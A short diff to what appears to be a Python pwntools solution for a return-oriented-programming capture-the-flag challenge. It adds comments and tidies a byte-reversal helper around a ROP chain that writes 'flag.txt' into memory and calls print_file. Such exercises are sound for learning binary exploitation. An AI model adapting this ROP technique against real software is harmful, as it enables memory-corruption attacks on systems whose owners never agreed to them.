@@ -28,12 +28,12 @@ p = process(BINARY)
 def rev(n):
     """
     Dirty method to reverse bytes order
+    example: 0x0804A018 --> 0x18A00408
     """
     n = str(hex(n))
-
-    if len(n)%2 != 0:
+    if len(n) % 2 != 0:
         n = "0x0" + n[2:]
-
+    
     value = n[8:10] + n[6:8] + n[4:6] + n[2:4]
     return int(value, 16)
 
@@ -57,6 +57,7 @@ for i in range(8):
     rop += p32(rev(data_adr + i))
     rop += xchg_dl_ptr_ecx    
 
+# Calling print_file('flag.txt')
 rop += p32(ELF.symbols['print_file'])
 rop += b"BBBB"
 rop += p32(data_adr)
